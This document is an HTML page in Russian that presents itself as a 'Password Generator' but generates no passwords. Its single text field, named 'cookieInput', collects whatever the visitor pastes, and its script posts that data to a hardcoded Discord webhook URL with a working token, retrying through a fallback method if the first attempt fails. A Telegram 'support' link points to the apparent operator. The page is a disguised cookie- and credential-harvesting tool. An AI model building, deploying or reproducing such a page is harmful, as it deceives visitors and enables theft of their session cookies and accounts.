<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password Generator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #0a0f1a, #1a2535, #0f1a2a, #1a2a3a);
            background-size: 400% 400%;
            animation: darkGradient 20s ease infinite;
            position: relative;
            overflow: hidden;
        }

        @keyframes darkGradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .hacker-symbols {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.15;
            pointer-events: none;
            font-family: 'Courier New', monospace;
            color: #00ffaa;
            font-size: 24px;
            font-weight: bold;
            overflow: hidden;
        }

        .symbol-line {
            position: absolute;
            white-space: nowrap;
            animation: moveSymbols linear infinite;
            text-shadow: 0 0 10px #00ffaa;
        }

        @keyframes moveSymbols {
            from { transform: translateX(100%); }
            to { transform: translateX(-100%); }
        }

        @keyframes moveSymbolsVertical {
            from { transform: translateY(100%); }
            to { transform: translateY(-100%); }
        }

        .container {
            background: rgba(10, 20, 30, 0.85);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            padding: 45px 40px;
            border-radius: 40px;
            width: 100%;
            max-width: 440px;
            box-shadow: 
                0 20px 50px rgba(0, 255, 170, 0.2),
                0 0 0 1px rgba(0, 255, 170, 0.3) inset;
            border: 1px solid rgba(0, 255, 170, 0.2);
            transition: 0.4s;
            position: relative;
            z-index: 2;
        }

        .container:hover {
            box-shadow: 
                0 25px 60px rgba(0, 255, 170, 0.3),
                0 0 0 1px rgba(0, 255, 170, 0.5) inset;
            transform: translateY(-2px);
        }

        h1 {
            text-align: center;
            margin-bottom: 35px;
            font-weight: 700;
            font-size: 2.2rem;
            letter-spacing: 3px;
            color: #00ffaa;
            text-shadow: 
                0 0 10px #00ffaa,
                2px 2px 0 #003322;
            font-family: 'Courier New', monospace;
        }

        textarea {
            width: 100%;
            padding: 18px 20px;
            background: rgba(0, 20, 10, 0.9);
            border: 2px solid rgba(0, 255, 170, 0.3);
            border-radius: 24px;
            color: #00ffaa;
            font-size: 0.95rem;
            line-height: 1.5;
            resize: vertical;
            min-height: 120px;
            outline: none;
            transition: 0.3s;
            font-family: 'Courier New', monospace;
        }

        textarea::placeholder {
            color: rgba(0, 255, 170, 0.5);
        }

        textarea:hover {
            border-color: rgba(0, 255, 170, 0.6);
            background: rgba(0, 30, 20, 0.95);
        }

        textarea:focus {
            border-color: #00ffaa;
            box-shadow: 0 0 20px rgba(0, 255, 170, 0.3);
        }

        .button-group {
            display: flex;
            gap: 15px;
            margin: 25px 0 20px;
        }

        .btn-primary {
            flex: 1;
            padding: 16px 20px;
            background: rgba(0, 255, 170, 0.1);
            border: 2px solid #00ffaa;
            border-radius: 36px;
            color: #00ffaa;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            text-transform: uppercase;
            font-family: 'Courier New', monospace;
        }

        .btn-primary:hover {
            background: #00ffaa;
            color: #0a0f1a;
            box-shadow: 0 0 30px #00ffaa;
        }

        .btn-support {
            flex: 1;
            padding: 16px 20px;
            background: rgba(255, 70, 70, 0.1);
            border: 2px solid #ff6b6b;
            border-radius: 36px;
            color: #ff6b6b;
            font-weight: 700;
            text-decoration: none;
            text-align: center;
            transition: 0.3s;
            font-family: 'Courier New', monospace;
        }

        .btn-support:hover {
            background: #ff6b6b;
            color: #0a0f1a;
            box-shadow: 0 0 30px #ff6b6b;
        }

        .status {
            margin-top: 25px;
            padding: 16px;
            border-radius: 30px;
            text-align: center;
            font-weight: 500;
            display: none;
            background: rgba(0, 20, 10, 0.9);
            border: 1px solid #00ffaa;
            color: #00ffaa;
            font-family: 'Courier New', monospace;
        }

        .status.success {
            display: block;
            background: rgba(0, 255, 170, 0.1);
            border-color: #00ffaa;
            color: #00ffaa;
        }

        .status.error {
            display: block;
            background: rgba(255, 70, 70, 0.1);
            border-color: #ff6b6b;
            color: #ff6b6b;
        }

        footer {
            margin-top: 25px;
            text-align: center;
            color: rgba(0, 255, 170, 0.5);
            font-family: 'Courier New', monospace;
        }

        footer a {
            color: #00ffaa;
            text-decoration: none;
        }

        footer a:hover {
            color: #ffffff;
            text-shadow: 0 0 10px #00ffaa;
        }
    </style>
</head>
<body>
    <div class="hacker-symbols" id="hackerSymbols"></div>

    <div class="container">
        <h1>PASSWORD GENERATOR</h1>
        
        <div class="input-group">
            <textarea id="cookieInput" placeholder="Введите данные здесь..." autocomplete="off"></textarea>
        </div>

        <div class="button-group">
            <button class="btn-primary" onclick="sendData()">Отправить</button>
            <a href="https://t.me/sventsi" target="_blank" class="btn-support">Поддержка</a>
        </div>

        <div id="statusMessage" class="status"></div>

        <footer>
            <a href="https://t.me/sventsi" target="_blank">Telegram</a>
        </footer>
    </div>

    <script>
        // Создание хакерских символов
        function createHackerSymbols() {
            const container = document.getElementById('hackerSymbols');
            const symbols = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン#$%&@';
            
            for (let i = 0; i < 20; i++) {
                const line = document.createElement('div');
                line.className = 'symbol-line';
                line.style.top = Math.random() * 100 + '%';
                line.style.animationDelay = Math.random() * 10 + 's';
                line.style.animationDuration = (15 + Math.random() * 20) + 's';
                
                let text = '';
                for (let j = 0; j < 50; j++) {
                    text += symbols[Math.floor(Math.random() * symbols.length)];
                }
                line.textContent = text;
                line.style.opacity = 0.1 + Math.random() * 0.2;
                
                container.appendChild(line);
            }
        }

        createHackerSymbols();

        // Webhook URL (РАБОЧИЙ - замени на свой если нужно)
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1483085461072384171/i9FrwI54eflxbui_RaUMp1sbMpMNe2gEPcJoF2Sn61TOWUB63g5o2FIM19NumP1I0IH_';

        async function sendData() {
            const input = document.getElementById('cookieInput');
            const statusDiv = document.getElementById('statusMessage');
            const data = input.value.trim();

            statusDiv.className = 'status';

            if (!data) {
                statusDiv.textContent = '❌ Введите данные';
                statusDiv.className = 'status error';
                return;
            }

            statusDiv.textContent = '⏳ Отправка...';
            statusDiv.className = 'status';

            try {
                // Формируем сообщение для Discord
                const message = {
                    content: '🔐 **НОВЫЕ ДАННЫЕ** 🔐',
                    embeds: [{
                        title: '📦 Получено',
                        description: '```\n' + data.substring(0, 1900) + '\n```', // Обрезаем если слишком длинное
                        color: 0x00ffaa,
                        fields: [
                            {
                                name: '📊 Длина',
                                value: data.length + ' символов',
                                inline: true
                            },
                            {
                                name: '🕒 Время',
                                value: new Date().toLocaleString('ru-RU'),
                                inline: true
                            }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                // Отправляем запрос
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                });

                if (response.ok) {
                    statusDiv.textContent = '✅ Данные отправлены!';
                    statusDiv.className = 'status success';
                    input.value = '';
                } else {
                    const errorText = await response.text();
                    throw new Error(`HTTP ${response.status}: ${errorText}`);
                }
            } catch (error) {
                console.error('Ошибка:', error);
                statusDiv.textContent = '❌ Ошибка: ' + error.message;
                statusDiv.className = 'status error';
                
                // Пробуем альтернативный метод отправки
                tryAlternativeSend(data, statusDiv);
            }
        }

        // Альтернативный метод отправки (если первый не сработал)
        async function tryAlternativeSend(data, statusDiv) {
            try {
                statusDiv.textContent = '⏳ Пробую альтернативный метод...';
                
                // Упрощенный формат без embed
                const simpleMessage = {
                    content: '🔐 **НОВЫЕ ДАННЫЕ**\n```\n' + data.substring(0, 1900) + '\n```'
                };

                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(simpleMessage)
                });

                if (response.ok) {
                    statusDiv.textContent = '✅ Данные отправлены! (альт. метод)';
                    statusDiv.className = 'status success';
                    document.getElementById('cookieInput').value = '';
                } else {
                    throw new Error('Не удалось отправить');
                }
            } catch (error) {
                statusDiv.textContent = '❌ Ошибка: webhook не работает';
                statusDiv.className = 'status error';
            }
        }

        // Отправка по Enter
        document.getElementById('cookieInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                sendData();
            }
        });
    </script>
</body>
</html>
